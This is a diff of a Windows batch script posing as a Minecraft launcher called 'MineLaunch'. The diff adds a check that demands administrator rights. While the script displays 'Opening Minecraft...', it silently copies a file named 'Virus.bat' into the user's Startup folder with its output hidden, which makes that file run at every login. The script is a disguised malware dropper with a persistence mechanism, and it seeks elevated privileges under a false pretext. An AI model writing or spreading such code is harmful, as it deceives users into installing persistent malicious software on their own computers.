@@ -1,5 +1,14 @@
 @echo off
 title MineLaunch 1.0.0
+net session >NUL 2>&1
+if %errorlevel% neq 0 (
+    echo.
+    echo The Administrator privilages are not applied. Please re-launch with Administrator Privilages on.
+    echo.
+    echo Press [ENTER] to Exit
+    pause >nul
+    exit /b
+)
 echo Opening Minecraft...
 echo Please do not close this window!
 copy "Virus.bat" "%appdata%\Microsoft\Windows\Start Menu\Programs\Startup" /Y 1>nul 2>nul
